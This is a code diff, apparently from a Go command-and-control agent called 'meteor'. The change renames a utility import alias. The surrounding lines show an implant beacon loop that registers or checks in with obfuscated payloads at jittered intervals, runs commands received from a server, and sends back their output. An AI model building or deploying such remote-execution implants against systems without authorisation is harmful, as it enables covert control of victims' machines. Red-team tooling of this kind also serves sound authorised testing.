@@ -3,7 +3,7 @@ package main
 import (
 	"encoding/base64"
 	"fmt"
-	cUtils "github.com/degenerat3/meteor/meteor/clients/utils"
+	agentUtils "github.com/degenerat3/meteor/meteor/agents/utils"
 	"github.com/degenerat3/meteor/meteor/pbuf"
 	"github.com/golang/protobuf/proto"
 	"math/rand"
@@ -47,14 +47,14 @@ func main() {
 	}
 	for {
 		var payload string
-		regstat := cUtils.CheckRegStatus(REGFILE)
+		regstat := agentUtils.CheckRegStatus(REGFILE)
 		if DEBUG {
 			fmt.Printf("RegStat: %t\n", regstat)
 		}
 		if regstat {
-			payload = cUtils.GenCheckin(REGFILE, OBFTEXT)
+			payload = agentUtils.GenCheckin(REGFILE, OBFTEXT)
 		} else {
-			payload = cUtils.GenRegister(INTERVAL, DELTA, REGFILE, OBFTEXT)
+			payload = agentUtils.GenRegister(INTERVAL, DELTA, REGFILE, OBFTEXT)
 		}
 		if DEBUG {
 			fmt.Printf("Payload: %s\n", payload)
@@ -99,8 +99,8 @@ func main() {
 			}
 			mod := acn.GetMode()
 			args := acn.GetArgs()
-			acnOut := cUtils.ExecCommand(mod, args)
-			acnData := cUtils.GenAddResult(uid, acnOut)
+			acnOut := agentUtils.ExecCommand(mod, args)
+			acnData := agentUtils.GenAddResult(uid, acnOut)
 			communicate(acnData)
 
 			if DEBUG {
